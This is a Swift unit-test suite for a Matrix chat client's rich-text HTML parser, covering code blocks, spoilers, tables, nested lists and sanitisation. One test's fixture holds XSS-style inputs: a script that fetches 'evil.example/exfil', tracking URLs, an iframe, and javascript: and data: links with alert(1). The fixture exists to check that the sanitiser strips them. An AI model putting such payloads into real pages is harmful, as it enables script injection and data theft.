import Foundation
import HaloBotRendering
import Testing

@Suite("RichTextParser (TIMELINE FR-13, M20-10)")
struct RichTextParserTests {
    @Test("Fenced code blocks preserve whitespace, entities, and optional language")
    func codeBlocks() {
        let html = #"""
        <p>Try this:</p><pre><code class="language-swift">func greet() {
            print("a &lt; b &amp;&amp; c")
        }
        </code></pre>
        """#
        let doc = RichTextParser.parse(html)
        #expect(doc.needsRichRendering)
        #expect(doc.blocks.count == 2)
        if case .codeBlock(let lang, let code) = doc.blocks[1] {
            #expect(lang == "swift")
            #expect(code == "func greet() {\n    print(\"a < b && c\")\n}")
        } else {
            Issue.record("expected codeBlock, got \(doc.blocks[1])")
        }
    }

    @Test("Spoilers with and without reason are parsed cleanly (inline and standalone)")
    func spoilers() {
        let html = #"Watch out: <span data-mx-spoiler="Movie ending">The butler did it</span> and <span data-mx-spoiler>hidden</span>."#
        let doc = RichTextParser.parse(html)
        #expect(doc.needsRichRendering)
        guard case .text(let segments) = doc.blocks.first else {
            Issue.record("expected text block")
            return
        }
        #expect(segments.count == 5)
        if case .spoiler(let reason, let content) = segments[1] {
            #expect(reason == "Movie ending")
            #expect(String(content.characters) == "The butler did it")
        } else {
            Issue.record("expected spoiler with reason")
        }
        if case .spoiler(let reason, let content) = segments[3] {
            #expect(reason == nil)
            #expect(String(content.characters) == "hidden")
        } else {
            Issue.record("expected spoiler without reason")
        }
    }

    @Test("Tables normalize headers and ragged rows")
    func tables() {
        let html = """
        <table>
          <thead><tr><th>Name</th><th>Status</th></tr></thead>
          <tbody>
            <tr><td>M20-9</td><td>Done</td></tr>
            <tr><td>M20-10</td></tr>
          </tbody>
        </table>
        """
        let doc = RichTextParser.parse(html)
        #expect(doc.needsRichRendering)
        guard case .table(let table) = doc.blocks.first else {
            Issue.record("expected table")
            return
        }
        #expect(table.headers == ["Name", "Status"])
        #expect(table.rows == [["M20-9", "Done"], ["M20-10", ""]])
        #expect(!table.truncated)
    }

    @Test("Nested unordered and ordered lists respect start attribute and clamp depth")
    func nestedLists() {
        let html = #"<ol start="3"><li>Third<ul><li>Sub A</li><li>Sub B</li></ul></li><li>Fourth</li></ol>"#
        let doc = RichTextParser.parse(html)
        #expect(doc.needsRichRendering)
        guard case .list(let items) = doc.blocks.first else {
            Issue.record("expected list")
            return
        }
        #expect(items.map(\.marker) == ["3.", "•", "•", "4."])
        #expect(items.map(\.depth) == [0, 1, 1, 0])
    }

    @Test("Hostile HTML drops scripts, styles, iframes, images, dangerous URLs, and caps pathological nesting and tables")
    func hostileHTMLCannotBreakLayoutOrFetchAnything() {
        let xss = """
        <mx-reply><blockquote>quoted</blockquote></mx-reply>
        <script>fetch("https://evil.example/exfil")</script>
        <style>body { background: url(https://evil.example/pixel.png); }</style>
        <img src="https://evil.example/track.png" alt="tracker"/>
        <iframe src="https://evil.example/frame">inner</iframe>
        <a href="javascript:alert(1)">Click</a>
        <a href="data:text/html,<script>alert(1)</script>">Data</a>
        <a href="https://matrix.org">Safe</a>
        """
        let doc = RichTextParser.parse(xss)
        let plainText = doc.blocks.map { block -> String in
            if case .text(let segments) = block {
                return segments.map {
                    switch $0 {
                    case .styled(let a): return String(a.characters)
                    case .spoiler(_, let a): return String(a.characters)
                    }
                }.joined()
            }
            return ""
        }.joined()
        #expect(!plainText.contains("exfil"))
        #expect(!plainText.contains("pixel.png"))
        #expect(!plainText.contains("quoted"))
        #expect(!plainText.contains("inner"))
        #expect(plainText.contains("Click"))
        #expect(plainText.contains("Safe"))

        // Verify only https://matrix.org kept its link.
        if case .text(let segments) = doc.blocks.first, case .styled(let attr) = segments.first {
            let urls = attr.runs.compactMap(\.link)
            #expect(urls == [URL(string: "https://matrix.org")!])
        }

        // Deeply nested lists (500 levels) clamp depth <= maxNestingDepth - 1 in linear time.
        let deepHTML = String(repeating: "<ul><li>", count: 500) + "leaf" + String(repeating: "</li></ul>", count: 500)
        let deepDoc = RichTextParser.parse(deepHTML)
        if case .list(let items) = deepDoc.blocks.first {
            #expect(items.allSatisfy { $0.depth < RichTextParser.maxNestingDepth })
        }

        // Giant 30x80 table is safely bounded to 12 cols x 50 rows and marked truncated.
        let rowCells = (0..<30).map { "<td>c\($0)</td>" }.joined()
        let giantTable = "<table>" + String(repeating: "<tr>\(rowCells)</tr>", count: 80) + "</table>"
        let tableDoc = RichTextParser.parse(giantTable)
        guard case .table(let table) = tableDoc.blocks.first else {
            Issue.record("expected bounded table")
            return
        }
        #expect(table.rows.count == RichTextParser.maxTableRows)
        #expect(table.rows.allSatisfy { $0.count == RichTextParser.maxTableColumns })
        #expect(table.truncated)
    }

    @Test("Simple inline formatting stays on fast path (needsRichRendering == false)")
    func simpleInlineStaysFast() {
        let doc = RichTextParser.parse("Hello <b>world</b> with <a href=\"https://matrix.org\">link</a>")
        #expect(!doc.needsRichRendering)
        #expect(doc.blocks.count == 1)
    }
}
